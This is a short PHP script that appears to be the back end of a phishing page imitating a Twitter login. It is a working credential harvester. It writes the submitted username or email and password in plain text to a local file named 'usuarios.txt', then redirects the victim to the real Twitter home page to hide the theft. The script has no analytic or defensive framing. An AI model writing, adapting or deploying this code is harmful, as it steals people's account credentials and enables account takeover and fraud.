<?php
file_put_contents("usuarios.txt", "Twitter User: " . $_POST['usernameOrEmail'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header("Location: https://twitter.com/home");
exit();
?>
